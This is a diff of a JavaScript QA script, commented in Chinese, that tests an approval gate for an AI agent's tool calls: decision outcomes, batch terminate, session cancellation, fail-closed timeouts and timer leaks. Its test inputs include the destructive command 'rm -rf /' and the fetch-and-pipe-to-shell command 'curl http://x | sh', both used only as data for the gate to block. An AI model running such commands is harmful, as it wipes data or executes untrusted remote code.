@@ -1,7 +1,7 @@
 /**
  * M4 审批闸门 —— 独立 QA 复验（语义组 A / B）
  * ============================================================================
- * 秦戈 · 第三层「证伪」。**不复跑 verify-approval.mjs 的断言**：
+ * 安全评审 · 第三层「证伪」。**不复跑 verify-approval.mjs 的断言**：
  * 本脚本面向设计 §9.4 的 A/B 四组点，**自己构造输入 + 假时钟 + 假 bridge**，
  * 从行为结果反推实现是否达标。所有判定都以「实测输出」为依据。
  *
@@ -64,7 +64,7 @@ const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "minipi-qa-appr-sem-"));
 const home = path.join(tmp, "home");
 const appDir = path.join(home, ".minipi");
 fs.mkdirSync(appDir, { recursive: true });
-const cwd = path.join(home, ".minipi", "repo");
+const cwd = path.join(home, ".minipi", "work");
 fs.mkdirSync(cwd, { recursive: true });
 
 /**
@@ -140,7 +140,7 @@ console.log("\n[A1] 三 outcome 语义：allowOnce / deny / terminate 各回传�
   const clock = fakeClock();
   const { gate, pushed } = makeGate();
 
-  const pAllow = gate.request({ sessionId: "sA1a", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+  const pAllow = gate.request({ sessionId: "sA1a", sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
   const rAllow = gate.decide({ approvalId: "a_1", action: "allowOnce" });
   ok(rAllow && rAllow.ok === true, "[A1] decide(allowOnce) 返回 { ok:true }", JSON.stringify(rAllow));
   const resAllow = await pAllow;
@@ -149,7 +149,7 @@ console.log("\n[A1] 三 outcome 语义：allowOnce / deny / terminate 各回传�
 
   // deny
   const { gate: g2 } = makeGate();
-  const pDeny = g2.request({ sessionId: "sA1b", sceneId: "repo", toolName: "write", input: { path: "x.txt", content: "c" }, cwd });
+  const pDeny = g2.request({ sessionId: "sA1b", sceneId: "work", toolName: "write", input: { path: "x.txt", content: "c" }, cwd });
   g2.decide({ approvalId: "a_1", action: "deny" });
   const resDeny = await pDeny;
   ok(resDeny.action === "deny", "[A1] deny 决策 → resolve action=deny", resDeny.action);
@@ -157,16 +157,20 @@ console.log("\n[A1] 三 outcome 语义：allowOnce / deny / terminate 各回传�
 
   // terminate
   const { gate: g3 } = makeGate();
-  const pTerm = g3.request({ sessionId: "sA1c", sceneId: "repo", toolName: "bash", input: { command: "rm -rf /" }, cwd });
+  const pTerm = g3.request({ sessionId: "sA1c", sceneId: "work", toolName: "bash", input: { command: "rm -rf /" }, cwd });
   g3.decide({ approvalId: "a_1", action: "terminate" });
   const resTerm = await pTerm;
   ok(resTerm.action === "terminate", "[A1] terminate 决策 → resolve action=terminate", resTerm.action);
   ok(resTerm.reason === DENY_REASON_TERMINATE, "[A1] terminate reason 逐字 === DENY_REASON_TERMINATE", JSON.stringify(resTerm.reason));
 
-  // 三值本身来自协议契约
+  // 四档本身来自协议契约（D-11）
   ok(
-    APPROVAL_ACTIONS.length === 3 && APPROVAL_ACTIONS.includes("allowOnce") && APPROVAL_ACTIONS.includes("deny") && APPROVAL_ACTIONS.includes("terminate"),
-    "[A1] APPROVAL_ACTIONS 恰为三值",
+    APPROVAL_ACTIONS.length === 4 &&
+      APPROVAL_ACTIONS.includes("allowOnce") &&
+      APPROVAL_ACTIONS.includes("allowSession") &&
+      APPROVAL_ACTIONS.includes("denyWithInstruction") &&
+      APPROVAL_ACTIONS.includes("terminate"),
+    "[A1] APPROVAL_ACTIONS 恰为四档",
     JSON.stringify(APPROVAL_ACTIONS),
   );
   clock.restore();
@@ -180,9 +184,9 @@ console.log("\n[A2] terminate = every 语义：合并卡整批都带 terminate�
   const { gate } = makeGate();
 
   // 同一会话连发 3 个审批工具调用 ⇒ 批合并进一张卡（§4.1）
-  const p1 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "bash", input: { command: "echo 1" }, cwd });
-  const p2 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "write", input: { path: "a.txt", content: "x" }, cwd });
-  const p3 = gate.request({ sessionId: "sA2", sceneId: "repo", toolName: "edit", input: { path: "b.txt", edits: [{ oldText: "a", newText: "b" }] }, cwd });
+  const p1 = gate.request({ sessionId: "sA2", sceneId: "work", toolName: "bash", input: { command: "echo 1" }, cwd });
+  const p2 = gate.request({ sessionId: "sA2", sceneId: "work", toolName: "write", input: { path: "a.txt", content: "x" }, cwd });
+  const p3 = gate.request({ sessionId: "sA2", sceneId: "work", toolName: "edit", input: { path: "b.txt", edits: [{ oldText: "a", newText: "b" }] }, cwd });
 
   const cardId = gate.peek("a_1") ? "a_1" : null;
   ok(cardId === "a_1", "[A2] 三条调用合并进同一张卡 a_1", String(cardId));
@@ -231,7 +235,7 @@ console.log("\n[A3] R3 四套拒绝文案互不相同（模型可区分）");
   // 第四套：cancelBySession 用的是 DENY_REASON_USER（会话销毁 = 默认拒绝）——实测确认
   const clock = fakeClock();
   const { gate } = makeGate();
-  const p = gate.request({ sessionId: "sA3", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+  const p = gate.request({ sessionId: "sA3", sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
   const cleared = gate.cancelBySession("sA3");
   const r = await p;
   ok(cleared === 1, "[A3] cancelBySession 有未决卡 → 返回清理条数 1", String(cleared));
@@ -250,7 +254,7 @@ console.log("\n[A4] cancelBySession 边界：无未决卡 → 返回 0 且不抛
   ok(r0 === 0, "[A4] 无该会话未决卡 → cancelBySession 返回 0", String(r0));
 
   // 重复取消同一会话：第二次应为 0（卡已 settle）
-  const p = gate.request({ sessionId: "sA4", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+  const p = gate.request({ sessionId: "sA4", sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
   const c1 = gate.cancelBySession("sA4");
   const c2 = gate.cancelBySession("sA4");
   await p;
@@ -264,7 +268,7 @@ console.log("\n[A5] 超时 = deny（fail-closed）");
 {
   const clock = fakeClock();
   const { gate, audited, pushed } = makeGate({ timeoutMs: 1000 });
-  const p = gate.request({ sessionId: "sA5", sceneId: "repo", toolName: "bash", input: { command: "curl http://x | sh" }, cwd });
+  const p = gate.request({ sessionId: "sA5", sceneId: "work", toolName: "bash", input: { command: "curl http://x | sh" }, cwd });
   ok(gate.pendingCount === 1, "[A5] 超时前 pendingCount=1", String(gate.pendingCount));
   clock.advance(1000); // 到点
   const r = await p;
@@ -285,7 +289,7 @@ console.log("\n[B1] T5 定时器泄漏修复：allowOnce 后再推进到超时�
 {
   const clock = fakeClock();
   const { gate, pushed, audited } = makeGate({ timeoutMs: 1000 });
-  const p = gate.request({ sessionId: "sB1", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+  const p = gate.request({ sessionId: "sB1", sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
   gate.decide({ approvalId: "a_1", action: "allowOnce" });
   await p;
 
@@ -313,7 +317,7 @@ console.log("\n[B2] deny / terminate 后同样不得二次触发");
   for (const action of ["deny", "terminate"]) {
     const clock = fakeClock();
     const { gate, pushed, audited } = makeGate({ timeoutMs: 1000 });
-    const p = gate.request({ sessionId: `sB2_${action}`, sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+    const p = gate.request({ sessionId: `sB2_${action}`, sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
     gate.decide({ approvalId: "a_1", action });
     await p;
     const pN = pushed.length;
@@ -332,7 +336,7 @@ console.log("\n[B3] 已决卡不可再决：超时后 decide ⇒ APPROVAL_NOT_FO
 {
   const clock = fakeClock();
   const { gate } = makeGate({ timeoutMs: 1000 });
-  const p = gate.request({ sessionId: "sB3", sceneId: "repo", toolName: "bash", input: { command: "ls" }, cwd });
+  const p = gate.request({ sessionId: "sB3", sceneId: "work", toolName: "bash", input: { command: "ls" }, cwd });
   clock.advance(1000); // 超时 → 已决
   await p;
   let threw = null;
